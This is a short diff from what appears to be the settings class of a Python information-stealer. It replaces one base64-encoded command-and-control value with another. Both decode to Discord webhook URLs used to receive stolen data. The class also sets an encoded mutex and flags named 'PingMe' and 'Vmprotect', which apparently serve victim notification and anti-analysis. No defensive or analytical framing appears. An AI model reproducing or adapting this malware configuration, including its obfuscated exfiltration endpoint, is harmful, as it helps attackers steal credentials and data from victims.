@@ -21,7 +21,7 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NDk3MTYyNzYwMzY5MzY2Mi94UkNiRDhQOFBGYVhtRFJvaExDeTJsY3VKZlZVd2U1WDl1WmFFbmp0aTdwd2FkempObkJta3hnNzEyZHNYVThlQ1otTA==').decode())
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NjA1MjQ4NDM3NjQzMjY3MS84TTgyTEVyVlM3U3Y5NExnVHpnLVFjaTl0dTE2a2k3Tnp0aWlQVGtRZXY0T3F2cDRLWGJIclRUWFBqSnZqLUZBSkt1UQ==').decode())
     Mutex = base64.b64decode('Z1F4VFExUlY1eWlLMWNDTQ==').decode()
     PingMe = bool('true')
     Vmprotect = bool('true')
